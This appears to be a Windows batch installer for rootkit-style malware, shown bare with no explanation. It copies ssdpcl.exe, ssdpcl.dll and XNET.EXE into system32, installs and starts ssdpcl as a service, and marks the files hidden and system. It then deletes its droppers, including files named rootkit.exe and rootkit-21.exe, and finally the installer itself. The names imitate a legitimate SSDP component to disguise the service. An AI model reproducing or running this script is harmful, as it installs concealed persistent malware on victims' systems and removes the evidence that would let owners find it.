@echo off
move ssdpcl.exe %windir%\system32
move ssdpcl.dll %windir%\system32
move XNET.EXE %windir%\system32
%windir%\system32\ssdpcl.exe -install
attrib +h +s -r %windir%\system32\ssdpcl.exe
attrib +h +s -r %windir%\system32\ssdpcl.dll
%windir%\system32\XNET.EXE start ssdpcl
del 4693.vbs
del 5927.txt
del rootkit.exe
del rootkit-21.exe
del %windir%\system32\XNET.EXE
del install.bat